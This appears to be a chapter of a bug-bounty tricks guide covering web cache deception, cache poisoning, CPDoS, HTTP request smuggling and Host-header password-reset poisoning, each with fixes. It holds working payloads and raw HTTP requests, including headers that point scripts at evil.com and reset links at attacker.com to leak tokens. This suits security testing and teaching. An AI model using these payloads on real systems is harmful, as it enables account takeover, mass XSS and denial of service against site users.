# 🗄️ Cache & Infrastructure (Tricks #35–#39)

> ⚠️ **Disclaimer:** Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

Cache and infrastructure bugs sit at the edge (CDN, WAF, reverse proxy) where
most testers don't look. They frequently pay **Critical** because they affect
**all users** — not just the attacker's session. These tricks cover web cache
deception, cache poisoning, request smuggling, and host header attacks.

---

## Table of Contents

1. [Web Cache Deception via Path Confusion](#trick-35)
2. [Cache Poisoning via Unkeyed Headers](#trick-36)
3. [CPDoS (Cache Poisoned Denial of Service)](#trick-37)
4. [HTTP Request Smuggling via CL.TE / TE.CL](#trick-38)
5. [Host Header Injection for Password Reset Poisoning](#trick-39)

---

<a name="trick-35"></a>
## 🧩 Trick #35 — Web Cache Deception via Path Confusion

**Category:** Cache / Infrastructure
**Impact:** High (sensitive data exposure)
**Tools:** Burp, browser

### The Idea
The CDN caches based on file extension (`.css`, `.js`, `.png`), but the
backend ignores the extension and returns **user-specific content**. Attacker
tricks the CDN into caching a victim's sensitive page under an attacker-guessable URL.

### Attack Flow

1. **Victim visits attacker's link:**
   ```
   https://target.com/account/profile/nonexistent.css
   ```

2. **CDN sees `.css`** → caches response.

3. **Backend ignores `.css`** → returns victim's profile HTML.

4. **Attacker fetches the same URL** → gets cached victim data.

### Payloads

```
/account/profile/nonexistent.css
/account/profile;.css
/account/profile%2F..%2Ffoo.css
/account/profile/.css
/account/profile%00.css
/account/profile%20.css
/account/profile.css
/account/profile.js
/account/profile.png
/account/profile.json
/account/profile/..%2f..%2fstatic%2fstyle.css
```

### Testing Steps

1. **Log in** to your test account.

2. **Visit your profile** with an appended extension:
   ```
   https://target.com/account/profile/foo.css
   ```

3. **Check response headers:**
   ```
   X-Cache: HIT
   Cache-Control: public, max-age=...
   Age: ...
   ```

4. **Log out, request the same URL** — do you still get your profile?

5. **If yes → cache deception confirmed.**

6. **Real attack:**
   - Send victim `https://target.com/account/profile/foo.css`
   - Victim visits while logged in
   - Attacker fetches same URL
   - Attacker sees victim's PII

### Why It Works
- CDN and backend disagree on what the URL means.
- CDN caches based on extension.
- Backend ignores extension and returns dynamic content.
- `Cache-Control: public` on authenticated pages.

### Fix
- Set `Cache-Control: private, no-store` on authenticated responses.
- Configure CDN to cache only static paths (`/static/`, `/assets/`).
- Use `Vary: Cookie` on dynamic endpoints.
- Don't cache responses with `Set-Cookie`.

### References
- [PortSwigger: Web cache deception](https://portswigger.net/web-security/web-cache-deception)

---

<a name="trick-36"></a>
## 🧩 Trick #36 — Cache Poisoning via Unkeyed Headers

**Category:** Cache / Infrastructure
**Impact:** Critical (affects all users)
**Tools:** Burp, `Param Miner` extension

### The Idea
CDNs build a cache key from a subset of request data (usually URL + Host).
Headers **not in the key** can still influence the response. If you inject a
malicious value via an unkeyed header, the CDN caches the poisoned response
**for all users**.

### Common Unkeyed Headers

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Forwarded-For
X-Host
X-Original-URL
X-Rewrite-URL
X-HTTP-Method-Override
X-HTTP-Method
X-Method-Override
Forwarded
X-Wap-Profile
Profile
```

### Classic Attack — X-Forwarded-Host

**Step 1:** Send request with malicious header:
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

**Step 2:** If response reflects `evil.com` (e.g., in `<script src="https://evil.com/...">`):
```html
<script src="https://evil.com/app.js"></script>
```

**Step 3:** CDN caches this response.

**Step 4:** Every user visiting `https://target.com/` gets:
```html
<script src="https://evil.com/app.js"></script>
```

**Step 5:** Your JS executes in every user's browser → mass XSS.

### Testing Steps

1. **Install Param Miner** in Burp.

2. **Right-click request → Extensions → Param Miner → Guess headers.**

3. **Watch for:**
   - Headers that change the response
   - `X-Cache: HIT` after injection
   - Reflected values in the response

4. **Confirm poisoning:**
   - Send request with header
   - Fetch the URL cleanly (without header)
   - If poisoned content is served → confirmed

### Advanced — Cache Key Normalization

Try to abuse CDN normalization:
```
Host: target.com
Host: target.com:80
Host: target.com.
Host: target.com..evil.com
Host: evil.com#target.com
```

Some CDNs normalize these in the cache key but forward them differently to
the origin — creating a poisoning primitive.

### Why It Works
- Response reflects headers that aren't in the cache key.
- CDN caches by (URL, Host) only.
- Malicious content persists until cache eviction.

### Fix
- Include **all response-affecting headers** in the cache key.
- Strip unknown headers at the edge.
- Ignore `X-Forwarded-*` from untrusted sources.
- Use `Vary` header correctly.
- Cache only safe, static content.

### References
- [PortSwigger: Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)

---

<a name="trick-37"></a>
## 🧩 Trick #37 — CPDoS (Cache Poisoned Denial of Service)

**Category:** Cache / Infrastructure
**Impact:** High (denial of service)
**Tools:** Burp, custom scripting

### The Idea
CPDoS abuses caching by forcing the CDN to cache **error responses** (4xx, 5xx)
for a URL. Once cached, all legitimate users get the error page until the
cache expires — effectively taking down that page.

### Attack Vectors

**1. HTTP Header Oversize (HHO):**
```
GET / HTTP/1.1
Host: target.com
X-Large-Header: AAAA... (8KB+)
```
→ Some origins return 400; CDN caches it.

**2. HTTP Meta Character (HMC):**
```
GET / HTTP/1.1
Host: target.com
X-Meta: \x00\x0A\x0D
```
→ Origin returns 400; CDN caches.

**3. HTTP Method Override (HMO):**
```
GET / HTTP/1.1
Host: target.com
X-HTTP-Method-Override: TRACE
```
→ Origin rejects; CDN caches error.

**4. HTTP Range Attack:**
```
GET / HTTP/1.1
Host: target.com
Range: bytes=0-1,999999999999
```
→ Origin returns 416; CDN caches.

**5. HTTP Cache Deception + Error:**
Combine with path confusion to cache the error under a popular URL.

### Steps

1. **Find a URL that is cached** (static page, homepage, product page).

2. **Send malformed request** (one of the above).

3. **Check response and headers:**
   ```
   HTTP/1.1 400 Bad Request
   X-Cache: HIT
   ```

4. **Fetch the same URL normally** (no malformed header).

5. **If you get the cached 400** → CPDoS confirmed.

6. **Business impact:**
   - Homepage down for all users
   - Checkout page down → revenue loss

### Why It Works
- CDNs cache 4xx/5xx responses by default (or misconfig).
- Malformed requests reach the origin, which rejects them.
- The cached error serves to every subsequent user.

### Fix
- **Never cache error responses** (4xx / 5xx).
- Configure CDN: `Cache-Control: no-store` on errors.
- Validate request headers at the edge.
- Reject oversized headers / invalid ranges before origin.
- Test cache behavior with malformed inputs.

### References
- [CPDoS research](https://cpdos.org/)

---

<a name="trick-38"></a>
## 🧩 Trick #38 — HTTP Request Smuggling via CL.TE / TE.CL

**Category:** Infrastructure
**Impact:** Critical
**Tools:** Burp (HTTP Request Smuggler extension), `smuggler.py`

### The Idea
When a front-end (CDN, reverse proxy) and back-end disagree on request
boundaries, an attacker can "smuggle" a second request hidden inside the
first. This can lead to **cache poisoning, auth bypass, and mass XSS**.

### Types

| Type   | Front-End Uses | Back-End Uses |
|--------|----------------|---------------|
| CL.TE  | Content-Length | Transfer-Encoding |
| TE.CL  | Transfer-Encoding | Content-Length |
| TE.TE  | Both, differently obfuscated | — |

### CL.TE Payload

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- **Front-end** uses `Content-Length: 13` → forwards `0\r\n\r\nSMUGGLED`.
- **Back-end** uses `Transfer-Encoding: chunked` → sees `0` (end of body),
  then treats `SMUGGLED` as a new request.

### TE.CL Payload

```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

- **Front-end** uses `Transfer-Encoding: chunked` → forwards full body.
- **Back-end** uses `Content-Length: 3` → sees only `8\r\n`, then treats
  remainder as new request.

### TE.TE Obfuscation Payloads

Try to make one server ignore the `Transfer-Encoding` header:
```
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked
Transfer-Encoding: chunked

Transfer-Encoding:\tchunked
Transfer-Encoding: chunked\n
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked, identity
X-Transfer-Encoding: chunked
```

### Exploitation Chain

1. **Smuggle a request** that poisons the next user's request:
   ```
   GET /admin HTTP/1.1
   Host: target.com
   X-Ignore: X
   ```
   → Next user's request goes to `/admin`.

2. **Cache poisoning:**
   - Smuggle a request to a static URL
   - Response gets cached for all users

3. **Auth bypass:**
   - Smuggle a request with another user's session cookie

### Steps

1. **Install HTTP Request Smuggler** in Burp.

2. **Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe.**

3. **Look for timing differences:**
   - A smuggled request causes a **timeout** or **delayed response**.

4. **Manual confirmation:**
   - Send CL.TE payload twice in a row.
   - Second request should show signs of the smuggled prefix.

5. **Escalate to cache poisoning / auth bypass.**

### Why It Works
- Front-end and back-end use different parsing rules.
- Spec ambiguity around `Content-Length` + `Transfer-Encoding`.
- No normalization at the edge.

### Fix
- **Reject requests with both CL and TE headers.**
- Normalize at the edge — strip one of them.
- Use HTTP/2 end-to-end (no CL/TE ambiguity).
- Patch known vulnerable proxies (nginx, HAProxy, AWS ALB).
- Monitor for anomalous request patterns.

### References
- [PortSwigger: HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)

---

<a name="trick-39"></a>
## 🧩 Trick #39 — Host Header Injection for Password Reset Poisoning

**Category:** Infrastructure / Auth
**Impact:** Critical (ATO)
**Tools:** Burp

### The Idea
When generating a password reset link, many apps use the `Host` header to
build the absolute URL. If the app trusts the `Host` header, you can inject
your own domain — the reset link in the victim's email points to **your**
server, leaking the token.

### Attack Flow

1. **Trigger password reset** for victim's email:
   ```
   POST /forgot-password
   email=victim@target.com
   ```

2. **Intercept and change the Host header:**
   ```
   Host: attacker.com
   ```

3. **Server generates reset email:**
   ```
   https://attacker.com/reset?token=SECRET
   ```

4. **Victim clicks the link → token hits your server.**

5. **Attacker uses the token** to reset victim's password → ATO.

### Header Variations

```
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
X-Original-URL: https://attacker.com
X-Rewrite-URL: https://attacker.com
```

### Advanced Variants

**1. Port injection:**
```
Host: target.com:attacker.com
```

**2. Subdomain injection:**
```
Host: target.com.attacker.com
```

**3. Userinfo injection:**
```
Host: target.com@attacker.com
```

**4. Trailing dot:**
```
Host: target.com.
```
Some servers strip the dot and treat it as `target.com` — but if the app
uses the raw header for the URL, it might break.

**5. Double Host header:**
```
Host: target.com
Host: attacker.com
```
Some servers use the first, some the last, some reject.

### Steps

1. **Trigger password reset** for your own account.

2. **Check the reset email** — does the link use the Host header?

3. **If yes, change Host to your domain.**

4. **Trigger again for your account** — does the email now point to your
   domain?

5. **If yes:**
   - Trigger reset for victim's email
   - Intercept the token in your server logs
   - Reset victim's password

### Why It Works
- Apps build absolute URLs from the `Host` header.
- No allowlist of valid hosts.
- Reset tokens are single-use and short-lived, but leak on click.

### Fix
- **Use a fixed, hardcoded host** for reset URLs (from config).
- Validate `Host` against an allowlist.
- Ignore `X-Forwarded-Host` from untrusted sources.
- Configure default vhost to reject unknown Host headers.
- Bind reset tokens to the user + email + a server-side nonce.

### References
- [PortSwigger: Host header attacks](https://portswigger.net/web-security/host-header)

---

## 📌 Quick Reference Summary

| #  | Trick                        | Impact   | Effort |
|----|------------------------------|----------|--------|
| 35 | Web cache deception          | High     | Low    |
| 36 | Cache poisoning              | Critical | Medium |
| 37 | CPDoS                        | High     | Low    |
| 38 | HTTP request smuggling       | Critical | High   |
| 39 | Host header reset poisoning  | Critical | Low    |

---

> **Prev:** [Business Logic ←](06-business-logic.md)
> **Next:** [API & Modern Stacks →](08-api-modern.md)
